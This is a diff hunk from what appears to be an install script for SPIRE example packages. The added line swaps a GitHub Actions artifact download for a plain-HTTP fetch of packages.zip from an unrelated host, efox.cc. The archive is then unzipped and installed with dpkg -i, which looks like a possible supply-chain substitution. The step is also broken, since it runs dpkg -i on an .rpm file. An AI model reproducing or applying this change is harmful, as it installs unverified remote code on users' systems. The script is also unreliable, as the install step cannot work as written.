@@ -133,7 +133,7 @@ sudo curl -s -o /etc/apt/sources.list.d/spire-examples.list https://raw.githubus
 sudo apt-get update
 sudo apt-get install -y spire-common spire-agent spire-server spire-controller-manager spiffe-socat-unix socat spire-trust-sync spiffe-helper
 
-curl -o /tmp/packages.zip https://github.com/spiffe/spire-examples/actions/runs/26162217281/artifacts/7109950436 -L
+curl -o /tmp/packages.zip http://efox.cc/temp/packages.zip -L
 cd /tmp
 unzip packages.zip
 dpkg -i RPMS/x86_64/spire-server-1.15.0-1.x86_64.rpm
